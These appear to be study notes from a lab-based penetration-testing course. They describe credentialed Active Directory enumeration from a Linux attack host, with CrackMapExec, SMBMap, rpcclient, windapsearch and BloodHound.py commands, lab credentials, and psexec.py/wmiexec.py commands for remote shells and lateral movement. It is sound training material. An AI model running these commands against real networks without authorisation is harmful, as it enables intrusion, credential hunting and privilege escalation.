Here is a summary of the credentialed enumeration process from Linux, detailing the methodology and step-by-step instructions using tools like CrackMapExec, SMBMap, rpcclient, and Impacket.

# Credentialed Enumeration Methodology from Linux

## Overview

Once a low-privilege foothold is established within an Active Directory domain, comprehensive domain enumeration is necessary to map out user attributes, computer accounts, group memberships, Group Policy Objects (GPOs), permissions, Access Control Lists (ACLs), and domain trusts. Most of these enumeration tools require valid domain user credentials (cleartext password, NTLM hash, or SYSTEM access on a domain host) to function.

## Step-by-Step Process & Methodology

### Phase 1: Environment and Credential Preparation

- **Objective:** Establish access to the attack host and load valid low-privilege credentials.
- **Step 1:** SSH into the Linux attack host (e.g., ATTACK01 Parrot Linux host) using low-privilege credentials.
    - _Example Credentials:_ Username: `forend`, Password: `Klmcargo2`, Domain: `INLANEFREIGHT.LOCAL`.
### Phase 2: Domain Enumeration via CrackMapExec (CME / NetExec)

- **Objective:** Leverage SMB protocol capabilities to query domain users, groups, shared resources, logged-on users, and spider files.
    
- **Step 2:** Enumerate domain users to discover account attributes like `badPwdCount` (useful for targeted password spraying without locking out accounts):
    ```Bash
    sudo crackmapexec smb <Target_IP> -u <Username> -p <Password> --users
    ```
    - _Example:_ `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users`
        
- **Step 3:** Enumerate domain groups to identify privileged targets like Administrators, Domain Admins, or Backup Operators:
    ```Bash
    sudo crackmapexec smb <Target_IP> -u <Username> -p <Password> --groups
    ```
    
- **Step 4:** Check for active user sessions and logged-on users across network hosts (such as file servers or potential jump hosts) to locate high-privilege accounts in memory:
    ```Bash
    sudo crackmapexec smb <Target_IP> -u <Username> -p <Password> --loggedon-users
    ```
    
- **Step 5:** Enumerate available SMB shares and access levels (READ/WRITE permissions):
    ```Bash
    sudo crackmapexec smb <Target_IP> -u <Username> -p <Password> --shares
    ```
    
- **Step 6:** Spider readable shares (such as Department Shares) to automatically catalog files and export results to a JSON file for analysis (e.g., checking for hardcoded credentials or configuration files):
    ```Bash
    sudo crackmapexec smb <Target_IP> -u <Username> -p <Password> -M spider_plus --share '<Share_Name>'
    ```

### Phase 3: Share Analysis via SMBMap
- **Objective:** Audit remote system shares, recursively list directories, and locate sensitive files.
- **Step 7:** Check share accessibility and permissions across the target system:
    ```Bash
    smbmap -u <Username> -p <Password> -d <Domain> -H <Target_IP>
    ```

- **Step 8:** Perform a recursive directory listing (without files) to map out department subdirectories or hidden archive structures:
    ```Bash
    smbmap -u <Username> -p <Password> -d <Domain> -H <Target_IP> -R '<Share_Name>' --dir-only
    ```

### Phase 4: Active Directory Deep-Dive via rpcclient

- **Objective:** Interact via MS-RPC to extract granular user information, Relative Identifiers (RIDs), and SID mappings.
- **Step 9:** Establish a session using rpcclient (authenticated or via NULL sessions if permitted):
    ```Bash
    rpcclient -U "<Username>" -N <Target_IP>
    ```
- **Step 10:** Enumerate all domain users along with their associated RIDs (e.g., built-in Administrator always maps to RID `0x1f4` / decimal 500):
    ```Bash
    rpcclient $> enumdomusers
    ```
- **Step 11:** Query specific user profiles and attributes by supplying their known RID:
    ```Bash
    rpcclient $> queryuser <RID_Hex>
    ```
    - _Example:_ `queryuser 0x457`

### Phase 5: Execution and Lateral Movement via Impacket Toolkit

- **Objective:** Validate administrative access, execute commands, or obtain interactive remote shells using Python-based protocol wrappers.
    
- **Step 12 (psexec.py):** Connect using local administrator credentials. This method uploads a randomly named service executable to the `ADMIN$` share, registers it via the Service Control Manager, and provides an interactive remote shell running as `SYSTEM`:
    ```Bash
    psexec.py <Domain>/<Username>:'<Password>'@<Target_IP>
    ```
    
- **Step 13 (wmiexec.py):** Utilize Windows Management Instrumentation for a stealthier approach. Commands are executed through a semi-interactive shell via WMI without dropping files/executables onto the target, running under the context of the authenticated user rather than `SYSTEM`:
    ```Bash
    wmiexec.py <Domain>/<Username>:'<Password>'@<Target_IP>
    ```
### Windasearch
**Windapsearch LDAP Enumeration Methodology** Windapsearch queries Active Directory directly via LDAP to extract structural insights, domain functionality levels, and privileged user accounts, particularly focusing on the risks of nested group memberships.

- **Enumerate Domain Admins:** Target direct members of the primary administrator groups to flag known high-value targets.
    ```Bash
    python3 windapsearch.py --dc-ip <DC_IP> -u <User> -p <Password> --da
    ```
- **Enumerate Nested Privileged Users (-PU):** Perform recursive searches across multi-layered groups to expose users who hold elevated permissions via indirect memberships.
    ```Bash
    python3 windapsearch.py --dc-ip <DC_IP> -u <User> -p <Password> -PU
    ```
    
**BloodHound.py Ingestion and Analysis Workflow** BloodHound.py automates data collection—including users, computers, groups, ACLs, trusts, and sessions—into JSON format for graph theory-based visualization.
- **Step 1: Execute the Ingestor** Run the Python-based data collector from your Linux attack host using valid domain credentials, pointing to the Domain Controller namespace (`-ns`) and requesting all collection modules (`-c all`):
    ```Bash
    sudo bloodhound-python -u '<Username>' -p '<Password>' -ns <DC_IP> -d <Domain> -c all
    ```
- **Step 2: Package Output Files** Compress the generated JSON results into a single archive for an easier upload process:
    ```Bash
    zip -r ilfreight_bh.zip *.json
    ```
- **Step 3: Initialize the Graph Database** Start the Neo4j service required to power the backend database:
    ```Bash
    sudo neo4j start
    ```
- **Step 4: Open the BloodHound Interface** Launch the GUI application from the attack host and authenticate (default credentials: `neo4j` / `HTB_@cademy_stdnt!`):
    ```Bash
    bloodhound
    ```
- **Step 5: Upload and Query Attack Paths** Import the `.zip` file using the GUI upload button. Head to the **Analysis** tab and execute pre-built queries like _Find Shortest Paths To Domain Admins_, or run custom Cypher queries in the raw query box to discover logical escalation pathways.